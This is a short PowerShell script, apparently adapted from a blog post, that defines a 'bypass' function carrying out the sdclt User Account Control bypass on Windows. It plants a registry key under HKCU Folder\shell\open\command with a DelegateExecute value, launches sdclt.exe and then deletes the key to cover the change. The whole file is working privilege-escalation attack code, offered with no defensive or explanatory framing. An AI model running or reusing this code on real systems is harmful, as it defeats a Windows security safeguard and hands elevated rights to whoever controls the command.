# This code was derived from http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass

function bypass {
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value ""
New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3
Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse
}